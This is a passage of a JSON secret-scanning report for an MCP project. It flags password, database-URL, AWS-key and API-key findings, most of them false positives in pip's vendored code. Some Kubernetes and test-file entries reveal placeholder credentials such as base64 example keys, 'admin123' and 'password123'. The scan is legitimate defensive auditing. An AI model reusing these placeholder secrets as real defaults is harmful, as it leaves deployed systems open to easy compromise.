          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 421,
            "severity": "CRITICAL",
            "context": "            username = username or \"\"\n            password = password or \"\"\n\n            # Store any acquired credentia"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 437,
            "severity": "CRITICAL",
            "context": "edentials for this request\n        url, username, password = self._get_url_and_credentials(req.url)\n\n        # Set the url of the request to the url "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 462,
            "severity": "CRITICAL",
            "context": "           return auth[0], auth[1], False\n        password = ask_password(\"Password: \")\n        return username, password, Tr"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 485,
            "severity": "CRITICAL",
            "context": "       if self.use_keyring:\n            username, password = self._get_new_credentials(\n                resp.url,\n                allow_n"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 492,
            "severity": "CRITICAL",
            "context": "   if not self.prompting and not username and not password:\n            return resp\n\n        parsed = urllib.parse.urlparse(resp"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 499,
            "severity": "CRITICAL",
            "context": "     save = False\n        if not username and not password:\n            username, password, save = self._prompt_for_password(parsed"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 512,
            "severity": "CRITICAL",
            "context": "           username=username,\n                    password=password,\n                )\n\n        # Consume content and "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 429,
            "severity": "CRITICAL",
            "context": "f make_rev_args(\n        username: Optional[str], password: Optional[HiddenText]\n    ) -> CommandArgs:\n        \"\"\"\n        Return "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 442,
            "severity": "CRITICAL",
            "context": "rev_and_auth(url.secret)\n        username, secret_password = user_pass\n        password: Optional[HiddenText] = None\n   "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 443,
            "severity": "CRITICAL",
            "context": "    username, secret_password = user_pass\n        password: Optional[HiddenText] = None\n        if secret_password is not None:\n  "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 445,
            "severity": "CRITICAL",
            "context": "      if secret_password is not None:\n            password = hide_value(secret_password)\n        extra_args = self.make_rev_args(username,"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
            "type": "passwords",
            "line": 98,
            "severity": "CRITICAL",
            "context": "f make_rev_args(\n        username: Optional[str], password: Optional[HiddenText]\n    ) -> CommandArgs:\n        extra_args: Command"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
            "type": "passwords",
            "line": 103,
            "severity": "CRITICAL",
            "context": "extra_args += [\"--username\", username]\n        if password:\n            extra_args += [\"--password\", password]\n\n        return extra"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
            "type": "passwords",
            "line": 142,
            "severity": "CRITICAL",
            "context": "  keyfile: _StrOrBytesPath | None = None,\n        password: _PasswordType | None = None,\n    ) -> None:\n        return self"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
            "type": "passwords",
            "line": 145,
            "severity": "CRITICAL",
            "context": "(\n            certfile=certfile, keyfile=keyfile, password=password\n        )\n\n    def load_default_certs(\n        se"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
            "type": "passwords",
            "line": 843,
            "severity": "CRITICAL",
            "context": "name = prefix\n        else:\n            username, password = prefix.split(':', 1)\n    if username:\n        username = unquote"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
            "type": "passwords",
            "line": 846,
            "severity": "CRITICAL",
            "context": "name:\n        username = unquote(username)\n    if password:\n        password = unquote(password)\n    return username, password"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
            "type": "passwords",
            "line": 83,
            "severity": "CRITICAL",
            "context": " self.username = cfg.get('username')\n        self.password = cfg.get('password')\n        self.realm = cfg.get('realm', '"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 320,
            "severity": "CRITICAL",
            "context": "      self.cert_file = cert_file\n        self.key_password = key_password\n        self.ssl_context = ssl_context\n        se"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 354,
            "severity": "CRITICAL",
            "context": "      self.cert_reqs = cert_reqs\n        self.key_password = key_password\n        self.assert_hostname = assert_hostname\n  "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 423,
            "severity": "CRITICAL",
            "context": "         certfile=self.cert_file,\n            key_password=self.key_password,\n            ca_certs=self.ca_certs,\n            c"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 967,
            "severity": "CRITICAL",
            "context": "      self.cert_reqs = cert_reqs\n        self.key_password = key_password\n        self.ca_certs = ca_certs\n        self.ca_"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 983,
            "severity": "CRITICAL",
            "context": "      key_file=self.key_file,\n                key_password=self.key_password,\n                cert_file=self.cert_file,\n       "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 1039,
            "severity": "CRITICAL",
            "context": "          key_file=self.key_file,\n            key_password=self.key_password,\n            **self.conn_kw\n        )\n\n        ret"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 53,
            "severity": "CRITICAL",
            "context": "   category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(userna"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 60,
            "severity": "CRITICAL",
            "context": "tin1\")\n\n    if isinstance(password, str):\n        password = password.encode(\"latin1\")\n\n    authstr = \"Basic \" + to_native_strin"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 81,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all("
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 112,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
            "type": "passwords",
            "line": 323,
            "severity": "CRITICAL",
            "context": "thorization\"]\n\n        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, pa"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
            "type": "passwords",
            "line": 329,
            "severity": "CRITICAL",
            "context": "f not scheme.startswith('https') and username and password:\n            headers[\"Proxy-Authorization\"] = _basic_auth_str(username, "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 214,
            "severity": "CRITICAL",
            "context": "ower().startswith(\"socks\"):\n            username, password = get_auth_from_url(proxy)\n            manager = self.proxy_manager[proxy] ="
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 218,
            "severity": "CRITICAL",
            "context": "               username=username,\n                password=password,\n                num_pools=self._pool_connections,"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 427,
            "severity": "CRITICAL",
            "context": "       \"\"\"\n        headers = {}\n        username, password = get_auth_from_url(proxy)\n\n        if username:\n            headers[\"Proxy-"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 69,
            "severity": "CRITICAL",
            "context": "r)\n            else prompt\n        )\n        self.password = password\n        if choices is not None:\n            self."
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 136,
            "severity": "CRITICAL",
            "context": " prompt,\n            console=console,\n            password=password,\n            choices=choices,\n            show_def"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 203,
            "severity": "CRITICAL",
            "context": "\n        \"\"\"\n        return console.input(prompt, password=password, stream=stream)\n\n    def check_choice(self, value:"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 363,
            "severity": "CRITICAL",
            "context": "umber={result}\")\n\n        while True:\n            password = Prompt.ask(\n                \"Please enter a password [cyan](m"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 370,
            "severity": "CRITICAL",
            "context": "ompt.invalid]password too short\")\n        print(f\"password={password!r}\")\n\n        fruit = Prompt.ask(\"Enter a fruit\", cho"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
            "type": "passwords",
            "line": 2109,
            "severity": "CRITICAL",
            "context": "ires a str prompt). Defaults to True.\n            password: (bool, optional): Hide typed text. Defaults to False.\n  "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
            "type": "passwords",
            "line": 2117,
            "severity": "CRITICAL",
            "context": "t, markup=markup, emoji=emoji, end=\"\")\n        if password:\n            result = getpass(\"\", stream=stream)\n        else:\n      "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/ssl_.py",
            "type": "passwords",
            "line": 385,
            "severity": "CRITICAL",
            "context": "SLContext.load_verify_locations().\n    :param key_password:\n        Optional password if the keyfile is encrypted.\n    :param "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/socks.py",
            "type": "passwords",
            "line": 102,
            "severity": "CRITICAL",
            "context": "_socks_options[\"username\"],\n                proxy_password=self._socks_options[\"password\"],\n                proxy_rdns=self._socks"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
            "type": "passwords",
            "line": 473,
            "severity": "CRITICAL",
            "context": "def load_cert_chain(self, certfile, keyfile=None, password=None):\n        self._ctx.use_certificate_chain_file(cert"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
            "type": "passwords",
            "line": 477,
            "severity": "CRITICAL",
            "context": "tance(password, six.binary_type):\n                password = password.encode(\"utf-8\")\n            self._ctx.set_passwd_cb(lambda"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/securetransport.py",
            "type": "passwords",
            "line": 873,
            "severity": "CRITICAL",
            "context": "def load_cert_chain(self, certfile, keyfile=None, password=None):\n        self._client_cert = certfile\n        self"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/_securetransport/low_level.py",
            "type": "passwords",
            "line": 231,
            "severity": "CRITICAL",
            "context": "4.b16encode(random_bytes[:8]).decode(\"utf-8\")\n    password = base64.b16encode(random_bytes[8:])  # Must be valid UTF-8\n    tempdirectory = tempfi"
          },
          {
            "file": "src/utils/database.py",
            "type": "database_urls",
            "line": 164,
            "severity": "CRITICAL",
            "context": "\n            await Tortoise.init(\n                db_url=self.config.url,\n                modules={\"models\": [\"src.database"
          },
          {
            "file": "src/utils/integration.py",
            "type": "database_urls",
            "line": 79,
            "severity": "CRITICAL",
            "context": "\n        \n    async def initialize_database(self, database_url: str):\n        \"\"\"\n        Initialize database manager w"
          },
          {
            "file": "src/utils/integration.py",
            "type": "database_urls",
            "line": 84,
            "severity": "CRITICAL",
            "context": "th connection.\n        \n        Args:\n            database_url: Database connection URL\n        \"\"\"\n        if not HAS_DAT"
          },
          {
            "file": "src/security/mcp_security_core.py",
            "type": "passwords",
            "line": 304,
            "severity": "CRITICAL",
            "context": "roduction, use proper key management)\n            password = secrets.token_bytes(32)\n            salt = secrets.token_bytes(16)\n      "
          },
          {
            "file": "src/database/connection.py",
            "type": "database_urls",
            "line": 142,
            "severity": "CRITICAL",
            "context": "     return\n            \n        try:\n            db_url = self._convert_to_tortoise_url(self.connection_string)\n            \n            await Tortoise.init(\n   "
          },
          {
            "file": "src/database/connection.py",
            "type": "database_urls",
            "line": 145,
            "severity": "CRITICAL",
            "context": "\n            await Tortoise.init(\n                db_url=db_url,\n                modules={\"models\": [\"src.database"
          },
          {
            "file": "src/database/init.py",
            "type": "database_urls",
            "line": 116,
            "severity": "CRITICAL",
            "context": ")\n        \n        # Set the database URL\n        db_url = self.connection_string or os.getenv(\"DATABASE_URL\", \"sqlite+aiosqlite://"
          },
          {
            "file": "src/auth/user_manager.py",
            "type": "passwords",
            "line": 149,
            "severity": "CRITICAL",
            "context": "ame,\n            email=request.email,\n            password=request.password\n        )\n        \n        user.roles = request.r"
          },
          {
            "file": "src/auth/user_manager.py",
            "type": "passwords",
            "line": 363,
            "severity": "CRITICAL",
            "context": "ername,\n            email=user.email,\n            password=new_password\n        )\n        try:\n            request.valida"
          },
          {
            "file": "src/auth/user_manager.py",
            "type": "passwords",
            "line": 429,
            "severity": "CRITICAL",
            "context": "ername,\n            email=user.email,\n            password=new_password\n        )\n        try:\n            request.valida"
          },
          {
            "file": "src/auth/api.py",
            "type": "passwords",
            "line": 203,
            "severity": "CRITICAL",
            "context": "           username=request.username,\n            password=request.password,\n            ip_address=client_ip\n        )\n      "
          },
          {
            "file": "src/auth/api.py",
            "type": "passwords",
            "line": 327,
            "severity": "CRITICAL",
            "context": "ord(\n        user_id=current_user.id,\n        old_password=request.old_password,\n        new_password=request.new_password\n    )\n "
          },
          {
            "file": "src/auth/api.py",
            "type": "passwords",
            "line": 328,
            "severity": "CRITICAL",
            "context": "   old_password=request.old_password,\n        new_password=request.new_password\n    )\n    \n    return {\"message\": \"Password chang"
          },
          {
            "file": "src/auth/api.py",
            "type": "passwords",
            "line": 423,
            "severity": "CRITICAL",
            "context": "st.username,\n        email=request.email,\n        password=request.password,\n        roles=request.roles\n    )\n    \n    user ="
          },
          {
            "file": "src/mcp/storage/cloud_storage_server.py",
            "type": "aws_keys",
            "line": 92,
            "severity": "CRITICAL",
            "context": "s_config = {\n            \"access_key\": os.getenv(\"AWS_ACCESS_KEY_ID\"),\n            \"secret_key\": os.getenv(\"AWS_SECRE"
          },
          {
            "file": "src/mcp/storage/cloud_storage_server.py",
            "type": "aws_keys",
            "line": 93,
            "severity": "CRITICAL",
            "context": "SS_KEY_ID\"),\n            \"secret_key\": os.getenv(\"AWS_SECRET_ACCESS_KEY\"),\n            \"region\": os.getenv(\"AWS_DEFAULT_R"
          },
          {
            "file": "src/mcp/storage/s3_server.py",
            "type": "aws_keys",
            "line": 35,
            "severity": "CRITICAL",
            "context": "elf.aws_access_key = aws_access_key or os.getenv(\"AWS_ACCESS_KEY_ID\")\n        self.aws_secret_key = aws_secret_key or"
          },
          {
            "file": "src/mcp/storage/s3_server.py",
            "type": "aws_keys",
            "line": 36,
            "severity": "CRITICAL",
            "context": "elf.aws_secret_key = aws_secret_key or os.getenv(\"AWS_SECRET_ACCESS_KEY\")\n        self.region = region or os.getenv(\"AWS_"
          },
          {
            "file": "test_environments/monitoring/alert_manager.py",
            "type": "passwords",
            "line": 1107,
            "severity": "CRITICAL",
            "context": "7,\n        username=\"alerts@example.com\",\n        password=\"password123\"\n    )\n    \n    # Start alert manager\n    alert_ma"
          },
          {
            "file": "test_environments/scaling/providers/aws_scaler.py",
            "type": "aws_keys",
            "line": 60,
            "severity": "CRITICAL",
            "context": " \"\"\"\n    \n    def __init__(\n        self,\n        aws_access_key_id: Optional[str] = None,\n        aws_secret_access_"
          },
          {
            "file": "test_environments/scaling/providers/aws_scaler.py",
            "type": "aws_keys",
            "line": 61,
            "severity": "CRITICAL",
            "context": " aws_access_key_id: Optional[str] = None,\n        aws_secret_access_key: Optional[str] = None,\n        region_name: str ="
          },
          {
            "file": "test_environments/scaling/providers/aws_scaler.py",
            "type": "aws_keys",
            "line": 74,
            "severity": "CRITICAL",
            "context": "      # Initialize AWS session\n                if aws_access_key_id and aws_secret_access_key:\n                    se"
          },
          {
            "file": "test_environments/scaling/providers/aws_scaler.py",
            "type": "aws_keys",
            "line": 74,
            "severity": "CRITICAL",
            "context": " session\n                if aws_access_key_id and aws_secret_access_key:\n                    self.session = boto3.Session"
          },
          {
            "file": "test_environments/scaling/providers/aws_scaler.py",
            "type": "aws_keys",
            "line": 76,
            "severity": "CRITICAL",
            "context": ".session = boto3.Session(\n                        aws_access_key_id=aws_access_key_id,\n                        aws_se"
          },
          {
            "file": "test_environments/scaling/providers/aws_scaler.py",
            "type": "aws_keys",
            "line": 76,
            "severity": "CRITICAL",
            "context": "ession(\n                        aws_access_key_id=aws_access_key_id,\n                        aws_secret_access_key=aw"
          },
          {
            "file": "test_environments/scaling/providers/aws_scaler.py",
            "type": "aws_keys",
            "line": 77,
            "severity": "CRITICAL",
            "context": "key_id=aws_access_key_id,\n                        aws_secret_access_key=aws_secret_access_key,\n                        re"
          },
          {
            "file": "test_environments/scaling/providers/aws_scaler.py",
            "type": "aws_keys",
            "line": 77,
            "severity": "CRITICAL",
            "context": "id,\n                        aws_secret_access_key=aws_secret_access_key,\n                        region_name=region_name\n"
          },
          {
            "file": "bandit_comprehensive_report.json",
            "type": "passwords",
            "line": 1597,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'auth.token.refresh'\",\n      \"line_number\": 61,\n      \"line_range\": [\n"
          },
          {
            "file": "bandit_comprehensive_report.json",
            "type": "passwords",
            "line": 1617,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'auth.token.revoked'\",\n      \"line_number\": 62,\n      \"line_range\": [\n"
          },
          {
            "file": "bandit_comprehensive_report.json",
            "type": "passwords",
            "line": 1637,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'user.password.changed'\",\n      \"line_number\": 71,\n      \"line_range\": [\n"
          },
          {
            "file": "bandit_comprehensive_report.json",
            "type": "passwords",
            "line": 1657,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'user.password.reset_requested'\",\n      \"line_number\": 72,\n      \"line_range\": [\n"
          },
          {
            "file": "bandit_comprehensive_report.json",
            "type": "passwords",
            "line": 1677,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'user.password.reset_completed'\",\n      \"line_number\": 73,\n      \"line_range\": [\n"
          },
          {
            "file": "bandit_comprehensive_report.json",
            "type": "passwords",
            "line": 1773,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'access'\",\n      \"line_number\": 191,\n      \"line_range\": ["
          },
          {
            "file": "bandit_comprehensive_report.json",
            "type": "passwords",
            "line": 1793,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'refresh'\",\n      \"line_number\": 218,\n      \"line_range\": ["
          },
          {
            "file": "bandit_comprehensive_report.json",
            "type": "passwords",
            "line": 1813,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'access'\",\n      \"line_number\": 264,\n      \"line_range\": ["
          },
          {
            "file": "bandit_comprehensive_report.json",
            "type": "passwords",
            "line": 1883,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'refresh'\",\n      \"line_number\": 332,\n      \"line_range\": ["
          },
          {
            "file": "bandit_comprehensive_report.json",
            "type": "passwords",
            "line": 1903,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'api_key'\",\n      \"line_number\": 419,\n      \"line_range\": ["
          },
          {
            "file": "bandit_comprehensive_report.json",
            "type": "passwords",
            "line": 1923,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'refresh'\",\n      \"line_number\": 246,\n      \"line_range\": ["
          },
          {
            "file": "docker-compose.monitoring.yml",
            "type": "passwords",
            "line": 46,
            "severity": "CRITICAL",
            "context": "CURITY_ADMIN_USER=admin\n      - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_ADMIN_PASSWORD}\n      - GF_USERS_ALLOW_SIGN_UP=false\n      - GF_I"
          },
          {
            "file": "full_stack_review_results.json",
            "type": "aws_keys",
            "line": 244,
            "severity": "CRITICAL",
            "context": ": null,\n        \"required\": false\n      },\n      \"AWS_ACCESS_KEY_ID\": {\n        \"set\": false,\n        \"value\": null,\n"
          },
          {
            "file": "full_stack_review_results.json",
            "type": "aws_keys",
            "line": 249,
            "severity": "CRITICAL",
            "context": ": null,\n        \"required\": false\n      },\n      \"AWS_SECRET_ACCESS_KEY\": {\n        \"set\": false,\n        \"value\": null,\n"
          },
          {
            "file": "docker-compose.mcp-production.yml",
            "type": "passwords",
            "line": 302,
            "severity": "CRITICAL",
            "context": "b\n      - POSTGRES_USER=mcp_user\n      - POSTGRES_PASSWORD=${DB_PASSWORD}\n      - POSTGRES_INITDB_ARGS=--auth-host=scram-sh"
          },
          {
            "file": "docker-compose.mcp-production.yml",
            "type": "passwords",
            "line": 359,
            "severity": "CRITICAL",
            "context": ":3000\"\n    environment:\n      - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_PASSWORD}\n      - GF_INSTALL_PLUGINS=grafana-clock-panel,gr"
          },
          {
            "file": "docker-compose.mcp-production.yml",
            "type": "database_urls",
            "line": 54,
            "severity": "CRITICAL",
            "context": "ironment:\n      - NODE_ENV=production\n      - MCP_DATABASE_URL=postgresql://mcp_user:${DB_PASSWORD}@postgres:5432/mcp_db\n      - MCP_REDIS_URL=redis://redis:6379/0\n      "
          },
          {
            "file": "docker-compose.mcp-production.yml",
            "type": "database_urls",
            "line": 102,
            "severity": "CRITICAL",
            "context": "rning_core\n      - MCP_ENV=production\n      - MCP_DATABASE_URL=postgresql://mcp_user:${DB_PASSWORD}@postgres:5432/mcp_db\n      - MCP_REDIS_URL=redis://redis:6379/1\n      "
          },
          {
            "file": "docker-compose.mcp-production.yml",
            "type": "database_urls",
            "line": 153,
            "severity": "CRITICAL",
            "context": "DS=4\n      - MCP_MAX_CONNECTIONS=1000\n      - MCP_DATABASE_URL=postgresql://mcp_user:${DB_PASSWORD}@postgres:5432/mcp_db\n    volumes:\n      - mcp-logs:/app/logs:rw\n      "
          },
          {
            "file": "k8s/secrets.yaml",
            "type": "api_keys",
            "line": 61,
            "severity": "CRITICAL",
            "context": "ed API keys - replace with actual values\n  openai-api-key: c2stcHJvai1hYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eg==\n  anthropic-api-key: YW50aHJvcGljX2FwaV9rZXlfYW"
          },
          {
            "file": "k8s/secrets.yaml",
            "type": "api_keys",
            "line": 62,
            "severity": "CRITICAL",
            "context": "hYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eg==\n  anthropic-api-key: YW50aHJvcGljX2FwaV9rZXlfYWJjZGVmZ2hpamtsbW5vcA==\n  google-api-key: Z29vZ2xlX2FwaV9rZXlfYWJjZGVmZ"
          },
          {
            "file": "k8s/secrets.yaml",
            "type": "api_keys",
            "line": 63,
            "severity": "CRITICAL",
            "context": "cGljX2FwaV9rZXlfYWJjZGVmZ2hpamtsbW5vcA==\n  google-api-key: Z29vZ2xlX2FwaV9rZXlfYWJjZGVmZ2hpamtsbW5vcA==\n\n---\napiVersion: v1\nkind: Secret\nmetadata:\n  na"
          },
          {
            "file": "k8s/secrets.yaml",
            "type": "api_keys",
            "line": 122,
            "severity": "CRITICAL",
            "context": "ob29rcy5zbGFjay5jb20vc2VydmljZXMvLi4u\n  pagerduty-api-key: cGFnZXJkdXR5X2FwaV9rZXlfc2VjcmV0\n\n---\napiVersion: v1\nkind: Secret\nmetadata:\n  name"
          },
          {
            "file": "k8s/secrets.yaml",
            "type": "passwords",
            "line": 15,
            "severity": "CRITICAL",
            "context": "o1NDMyL2RibmFtZQ==\n  username: Y2xhdWRlX3VzZXI=\n  password: c3VwZXJfc2VjdXJlX3Bhc3N3b3Jk\n  host: Y2xhdWRlLWRlcGxveW1lbnQtZGI=\n  port: NTQz"
          },
          {
            "file": "k8s/secrets.yaml",
            "type": "passwords",
            "line": 33,
            "severity": "CRITICAL",
            "context": "XM6Ly9jbGF1ZGUtZGVwbG95bWVudC1yZWRpczo2Mzc5LzA=\n  password: cmVkaXNfc2VjdXJlX3Bhc3N3b3Jk\n\n---\napiVersion: v1\nkind: Secret\nmetadata:\n  name"
          },
          {
            "file": "k8s/secrets.yaml",
            "type": "passwords",
            "line": 77,
            "severity": "CRITICAL",
            "context": "64 encoded monitoring credentials\n  grafana-admin-password: Z3JhZmFuYV9hZG1pbl9wYXNzd29yZA==\n  prometheus-basic-auth: cHJvbWV0aGV1czpzZWN1cmVf"
          },
          {
            "file": "k8s/secrets.yaml",
            "type": "database_urls",
            "line": 13,
            "severity": "CRITICAL",
            "context": "e64 encoded values - replace with actual values\n  database-url: cG9zdGdyZXNxbDovL3VzZXI6cGFzc3dvcmRAaG9zdDo1NDMyL2RibmFtZQ==\n  username: Y2xhdWRlX3VzZXI=\n  password: c3VwZXJf"
          },
          {
            "file": "k8s/secrets.yaml",
            "type": "aws_keys",
            "line": 136,
            "severity": "CRITICAL",
            "context": "que\ndata:\n  # Base64 encoded backup credentials\n  aws-access-key-id: QUtJQUlPU0ZPRE5ON0VYQU1QTEU=\n  aws-secret-access"
          },
          {
            "file": "k8s/secrets.yaml",
            "type": "aws_keys",
            "line": 137,
            "severity": "CRITICAL",
            "context": "aws-access-key-id: QUtJQUlPU0ZPRE5ON0VYQU1QTEU=\n  aws-secret-access-key: d0phbFJYVXRuRkVNSS9LN01ERU5HL2JQeFJmaUNZRVhBTVBM"
          },
          {
            "file": "k8s/mcp-deployments.yaml",
            "type": "aws_keys",
            "line": 347,
            "severity": "CRITICAL",
            "context": "LOG_LEVEL\n          value: \"info\"\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n  "
          },
          {
            "file": "k8s/mcp-deployments.yaml",
            "type": "aws_keys",
            "line": 352,
            "severity": "CRITICAL",
            "context": "\n              key: access-key-id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n  "
          },
          {
            "file": "k8s/mcp-deployment.yaml",
            "type": "passwords",
            "line": 43,
            "severity": "CRITICAL",
            "context": "t-secret: \"your-secure-jwt-secret-here\"\n  grafana-password: \"secure-grafana-password\"\n\n---\n# TypeScript MCP API Deployment\napiVersion: "
          },
          {
            "file": "k8s/mcp-deployment.yaml",
            "type": "database_urls",
            "line": 40,
            "severity": "CRITICAL",
            "context": "espace: mcp-production\ntype: Opaque\nstringData:\n  database-url: \"postgresql://mcp_user:secure_password@postgres:5432/mcp_db\"\n  redis-url: \"redis://redis:6379\"\n  jwt-secret: \""
          },
          {
            "file": "k8s/mcp-monitoring.yaml",
            "type": "passwords",
            "line": 472,
            "severity": "CRITICAL",
            "context": "ld be replaced with actual values\n  grafana-admin-password: YWRtaW4xMjM=  # admin123\n  prometheus-password: cHJvbWV0aGV1cz"
          },
          {
            "file": "k8s/mcp-monitoring.yaml",
            "type": "passwords",
            "line": 473,
            "severity": "CRITICAL",
